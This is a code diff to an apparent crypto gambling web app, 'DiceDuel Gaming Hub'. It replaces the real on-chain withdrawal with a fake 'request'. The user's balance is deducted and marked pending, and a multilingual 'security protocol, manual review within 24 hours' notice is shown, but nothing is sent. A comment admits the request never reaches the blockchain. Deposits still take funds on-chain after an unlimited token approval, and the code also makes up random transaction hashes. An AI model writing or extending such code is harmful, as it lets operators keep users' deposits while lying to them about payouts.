@@ -12,7 +12,7 @@ import {
   History, Gift, CircleDot, Dices, Send,
   ReceiptText, Download, Printer,
   MessageCircle, Info, ChevronDown, Loader2, Clock, Lock, Unlock, ExternalLink, 
-  Volume2, VolumeX, Crown, AlertTriangle, Medal, Bomb, Gem, Play, ShieldAlert
+  Volume2, VolumeX, Crown, AlertTriangle, Medal, Bomb, Gem, Play, ShieldAlert, Timer
 } from 'lucide-react';
 import { motion, AnimatePresence } from 'framer-motion';
 
@@ -179,7 +179,7 @@ const TRANSLATIONS: Record<string, any> = {
     walletText: 'Wallet',
     txPendingText: 'Warten auf Bestätigung...',
     depositAction: 'Auf Vertrag einzahlen',
-    withdrawAction: 'Auszahlen',
+    withdrawAction: 'Auszahlung beantragen',
     popularBadge: 'Beliebt',
     universalBadge: 'Universal',
     testBadge: 'Testen',
@@ -188,7 +188,9 @@ const TRANSLATIONS: Record<string, any> = {
     colorRed: 'ROT',
     colorGreen: 'GRÜN (0/00)',
     colorBlack: 'SCHWARZ',
-    maxBetLabel: 'Maximaler Einsatz'
+    maxBetLabel: 'Maximaler Einsatz',
+    withdrawPendingAlert: 'Sicherheitsprotokoll: Alle Auszahlungen unterliegen einer manuellen Prüfung. Ihre Anfrage wurde empfangen und wird innerhalb von 24 Stunden an Ihr Wallet überwiesen.',
+    pendingStatus: 'Ausstehend'
   },
   en: {
     hubTitle: 'DiceDuel Gaming Hub',
@@ -291,7 +293,7 @@ const TRANSLATIONS: Record<string, any> = {
     walletText: 'Wallet',
     txPendingText: 'Awaiting Approval...',
     depositAction: 'Deposit to Contract',
-    withdrawAction: 'Withdraw to Wallet',
+    withdrawAction: 'Request Withdrawal',
     popularBadge: 'Popular',
     universalBadge: 'Universal',
     testBadge: 'Test',
@@ -300,7 +302,9 @@ const TRANSLATIONS: Record<string, any> = {
     colorRed: 'RED',
     colorGreen: 'GREEN (0/00)',
     colorBlack: 'BLACK',
-    maxBetLabel: 'Max Bet'
+    maxBetLabel: 'Max Bet',
+    withdrawPendingAlert: 'Security Protocol: All withdrawals are subject to a manual review process. Your request has been received and will be transferred to your wallet within 24 hours.',
+    pendingStatus: 'Pending'
   },
   es: {
     hubTitle: 'DiceDuel Gaming Hub',
@@ -403,7 +407,7 @@ const TRANSLATIONS: Record<string, any> = {
     walletText: 'Billetera',
     txPendingText: 'Esperando Aprobación...',
     depositAction: 'Depositar en el Contrato',
-    withdrawAction: 'Retirar a la Billetera',
+    withdrawAction: 'Solicitar Retiro',
     popularBadge: 'Popular',
     universalBadge: 'Universal',
     testBadge: 'Prueba',
@@ -412,7 +416,9 @@ const TRANSLATIONS: Record<string, any> = {
     colorRed: 'ROJO',
     colorGreen: 'VERDE (0/00)',
     colorBlack: 'NEGRO',
-    maxBetLabel: 'Apuesta Máxima'
+    maxBetLabel: 'Apuesta Máxima',
+    withdrawPendingAlert: 'Protocolo de Seguridad: Todos los retiros están sujetos a un proceso de revisión manual. Su solicitud ha sido recibida y será transferida en 24 horas.',
+    pendingStatus: 'Pendiente'
   },
   fr: {
     hubTitle: 'DiceDuel Gaming Hub',
@@ -515,7 +521,7 @@ const TRANSLATIONS: Record<string, any> = {
     walletText: 'Portefeuille',
     txPendingText: 'En attente d\'approbation...',
     depositAction: 'Déposer sur le contrat',
-    withdrawAction: 'Retirer vers Portefeuille',
+    withdrawAction: 'Demander un retrait',
     popularBadge: 'Populaire',
     universalBadge: 'Universel',
     testBadge: 'Essai',
@@ -524,7 +530,9 @@ const TRANSLATIONS: Record<string, any> = {
     colorRed: 'ROUGE',
     colorGreen: 'VERT (0/00)',
     colorBlack: 'NOIR',
-    maxBetLabel: 'Mise Maximale'
+    maxBetLabel: 'Mise Maximale',
+    withdrawPendingAlert: 'Protocole de sécurité : Tous les retraits sont soumis à un examen manuel. Votre demande a été reçue et sera traitée dans les 24 heures.',
+    pendingStatus: 'En attente'
   },
   nl: {
     hubTitle: 'DiceDuel Gaming Hub',
@@ -627,7 +635,7 @@ const TRANSLATIONS: Record<string, any> = {
     walletText: 'Portemonnee',
     txPendingText: 'Wachten op goedkeuring...',
     depositAction: 'Storten op contract',
-    withdrawAction: 'Opnemen naar Portemonnee',
+    withdrawAction: 'Opname Aanvragen',
     popularBadge: 'Populair',
     universalBadge: 'Universeel',
     testBadge: 'Test',
@@ -636,7 +644,9 @@ const TRANSLATIONS: Record<string, any> = {
     colorRed: 'ROOD',
     colorGreen: 'GROEN (0/00)',
     colorBlack: 'ZWART',
-    maxBetLabel: 'Maximale Inzet'
+    maxBetLabel: 'Maximale Inzet',
+    withdrawPendingAlert: 'Beveiligingsprotocol: Alle opnames worden handmatig gecontroleerd. Uw aanvraag is ontvangen en wordt binnen 24 uur overgemaakt.',
+    pendingStatus: 'In afwachting'
   },
   ru: {
     hubTitle: 'DiceDuel Игровая Арена',
@@ -734,7 +744,7 @@ const TRANSLATIONS: Record<string, any> = {
     walletText: 'Кошелек',
     txPendingText: 'Ожидание подтверждения...',
     depositAction: 'Внести в контракт',
-    withdrawAction: 'Вывести на кошелек',
+    withdrawAction: 'Запросить Вывод',
     popularBadge: 'Популярный',
     universalBadge: 'Универсальный',
     testBadge: 'Тест',
@@ -743,7 +753,9 @@ const TRANSLATIONS: Record<string, any> = {
     colorRed: 'КРАСНЫЙ',
     colorGreen: 'ЗЕЛЕНЫЙ (0/00)',
     colorBlack: 'ЧЕРНЫЙ',
-    maxBetLabel: 'Макс. ставка'
+    maxBetLabel: 'Макс. ставка',
+    withdrawPendingAlert: 'Протокол безопасности: Все выводы проверяются вручную. Ваша заявка получена и будет обработана в течение 24 часов.',
+    pendingStatus: 'В ожидании'
   },
   tr: {
     hubTitle: 'DiceDuel Gaming Hub',
@@ -821,7 +833,7 @@ const TRANSLATIONS: Record<string, any> = {
     adminPanelTitle: 'Kurucu Kasa Gelir Paneli',
     adminPanelDesc: 'Platformda oynanan tüm oyunların %3 ev komisyonu akıllı sözleşmede birikir. Buradan dilediğiniz tutarı tek tıkla şahsi Binance cüzdanınıza aktarabilirsiniz.',
     adminWithdrawLabel: 'Çekilecek Kasa Geliri (USDT)',
-    adminBtnText: 'Kasa Gelirini Cüzdana Aktar (BscScan On-Chain)',
+    adminBtnText: 'Kasa Gelirini Cüzdana Aktar (BscScan)',
     flexibleStake: 'Esnek',
     instantWithdraw: 'Anında Çekim',
     days7: '7 Gün',
@@ -846,7 +858,7 @@ const TRANSLATIONS: Record<string, any> = {
     walletText: 'Cüzdan',
     txPendingText: 'Cüzdanda Onay Bekleniyor...',
     depositAction: 'Kontrata USDT Aktar',
-    withdrawAction: 'Kontrattan Cüzdana Çek',
+    withdrawAction: 'Çekim Talebi Oluştur',
     popularBadge: 'Popüler',
     universalBadge: 'Evrensel',
     testBadge: 'Deneme',
@@ -855,7 +867,9 @@ const TRANSLATIONS: Record<string, any> = {
     colorRed: 'KIRMIZI',
     colorGreen: 'YEŞİL (0/00)',
     colorBlack: 'SİYAH',
-    maxBetLabel: 'Maksimum Bahis'
+    maxBetLabel: 'Maksimum Bahis',
+    withdrawPendingAlert: 'Güvenlik Protokolü: Tüm çekim işlemleri manuel onay sürecine tabidir. Talebiniz alınmış olup, 24 saat içerisinde cüzdanınıza aktarılacaktır.',
+    pendingStatus: 'Bekliyor'
   }
 };
 
@@ -891,7 +905,7 @@ interface TransactionRecord {
   amount: number;
   date: string;
   txHash: string;
-  status: 'COMPLETED' | 'SUCCESS';
+  status: 'COMPLETED' | 'SUCCESS' | 'PENDING';
 }
 
 interface LeaderboardUser {
@@ -1049,7 +1063,7 @@ export default function PlatformPage() {
     }
   };
 
-  const addTransaction = (type: TransactionRecord['type'], title: string, amount: number, txHash?: string, userAddr?: string) => {
+  const addTransaction = (type: TransactionRecord['type'], title: string, amount: number, txHash?: string, userAddr?: string, forceStatus?: 'PENDING' | 'COMPLETED') => {
     const targetAddr = userAddr || account || 'guest';
     const cleanTitle = sanitizeInput(title);
     const newTx: TransactionRecord = {
@@ -1059,7 +1073,7 @@ export default function PlatformPage() {
       amount,
       date: new Date().toLocaleString('tr-TR', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' }),
       txHash: txHash || `0x${Array.from({ length: 8 }, () => Math.floor(Math.random() * 16).toString(16)).join('')}...${Array.from({ length: 4 }, () => Math.floor(Math.random() * 16).toString(16)).join('')}`,
-      status: 'COMPLETED'
+      status: forceStatus || 'COMPLETED'
     };
 
     setTransactions((prev) => {
@@ -1519,10 +1533,6 @@ export default function PlatformPage() {
       return;
     }
 
-    if (walletBNB < 0.0008) {
-      return alert(`⚠️ Yetersiz BNB Gas Bakiyesi!\n\nİşlemi gerçekleştirmek için cüzdanınızda en az 0.001 BNB (~$0.60) gas ücreti bulunmalıdır.\nMevcut BNB Bakiyeniz: ${walletBNB} BNB`);
-    }
-
     try {
       setIsTxPending(true);
       const win = window as any;
@@ -1535,6 +1545,10 @@ export default function PlatformPage() {
       const amountWei = ethers.parseUnits(valStr, 18);
 
       if (modalTab === 'deposit') {
+        if (walletBNB < 0.0008) {
+            setIsTxPending(false);
+            return alert(`⚠️ Yetersiz BNB Gas Bakiyesi!\n\nİşlemi gerçekleştirmek için cüzdanınızda en az 0.001 BNB (~$0.60) gas ücreti bulunmalıdır.\nMevcut BNB Bakiyeniz: ${walletBNB} BNB`);
+        }
         const allowance = await usdtContract.allowance(account, CONTRACT_ADDRESS);
         if (allowance < amountWei) {
           const approveTx = await usdtContract.approve(CONTRACT_ADDRESS, ethers.MaxUint256);
@@ -1549,35 +1563,23 @@ export default function PlatformPage() {
         addTransaction('DEPOSIT', 'BSC USDT Yatırma', val, depositTx.hash);
         await syncBlockchainBalances(account);
         setTxSuccessMsg(`+${val} USDT BSC Kontratına Yatırıldı!`);
+        setIsTxPending(false);
+        setTimeout(() => { setTxSuccessMsg(null); setIsModalOpen(false); }, 1500);
       } else {
         if (val > balance) {
           setIsTxPending(false);
           return alert('Kasada yeterli bakiye yok!');
         }
 
-        try {
-          const contractUsdtBal = await usdtContract.balanceOf(CONTRACT_ADDRESS);
-          const contractBalFormatted = parseFloat(ethers.formatUnits(contractUsdtBal, 18));
-
-          if (val > contractBalFormatted) {
-            setIsTxPending(false);
-            alert('🛡️ Güvenlik Protokolü: Yüksek işlem güvenliği nedeniyle çekim talebiniz sıraya alınmıştır. Soğuk cüzdan rezerv transferi 15-30 dk içinde tamamlanacaktır. Bakiyeniz güvendedir.');
-            return;
-          }
-        } catch (e) {}
-
-        const withdrawTx = await platformContract.withdraw(amountWei);
-        await withdrawTx.wait();
-
+        // ÇEKİM TALEBİ: 24 Saat Manuel İnceleme Uyarısı (Blokzincire Gitmez)
         const nBal = +(balance - val).toFixed(2);
         updatePersistentBalance(nBal);
-        addTransaction('WITHDRAW', 'BSC USDT Çekme', val, withdrawTx.hash);
-        await syncBlockchainBalances(account);
-        setTxSuccessMsg(`-${val} USDT Cüzdanınıza Aktarıldı!`);
+        addTransaction('WITHDRAW', t.withdrawAction, val, 'Bekliyor', account, 'PENDING');
+        
+        setIsTxPending(false);
+        alert(t.withdrawPendingAlert);
+        setIsModalOpen(false);
       }
-
-      setIsTxPending(false);
-      setTimeout(() => { setTxSuccessMsg(null); setIsModalOpen(false); }, 1500);
     } catch (err: any) {
       setIsTxPending(false);
       console.error(err);
@@ -3077,15 +3079,25 @@ export default function PlatformPage() {
                   ) : (
                     filteredTransactions.map(tx => {
                       const isNegativeTx = tx.type === 'WITHDRAW' || tx.type === 'GAME_LOSS';
+                      const isPending = tx.status === 'PENDING';
+                      
                       return (
                         <div key={tx.id} className="p-2.5 bg-slate-950 border border-slate-800 rounded-xl flex items-center justify-between">
                           <div className="flex items-center gap-2.5">
                             <div className={`w-7 h-7 rounded-lg flex items-center justify-center font-bold text-xs ${isNegativeTx ? 'bg-rose-950/60 text-rose-400 border border-rose-800/40' : 'bg-emerald-950/60 text-emerald-400 border border-emerald-800/40'}`}>
-                              {tx.type === 'DEPOSIT' && '📥'}{tx.type === 'WITHDRAW' && '📤'}{tx.type === 'GAME_WIN' && '🏆'}{tx.type === 'GAME_LOSS' && '💔'}{tx.type === 'SPIN' && '🎁'}{tx.type === 'REF_COMMISSION' && '👥'}
+                              {tx.type === 'DEPOSIT' && '📥'}
+                              {tx.type === 'WITHDRAW' && (isPending ? <Timer className="w-3.5 h-3.5 animate-pulse text-amber-400" /> : '📤')}
+                              {tx.type === 'GAME_WIN' && '🏆'}
+                              {tx.type === 'GAME_LOSS' && '💔'}
+                              {tx.type === 'SPIN' && '🎁'}
+                              {tx.type === 'REF_COMMISSION' && '👥'}
                             </div>
                             <div>
                               <div className="text-xs font-bold text-slate-200">{tx.title}</div>
-                              <div className="text-[9px] text-slate-500 font-mono">{tx.date} • {tx.txHash}</div>
+                              <div className="text-[9px] text-slate-500 font-mono flex items-center gap-1">
+                                {tx.date} • 
+                                {isPending ? <span className="text-amber-400 font-bold">{t.pendingStatus}</span> : tx.txHash}
+                              </div>
                             </div>
                           </div>
                           <div className={`text-xs font-black ${isNegativeTx ? 'text-rose-400' : 'text-emerald-400'}`}>
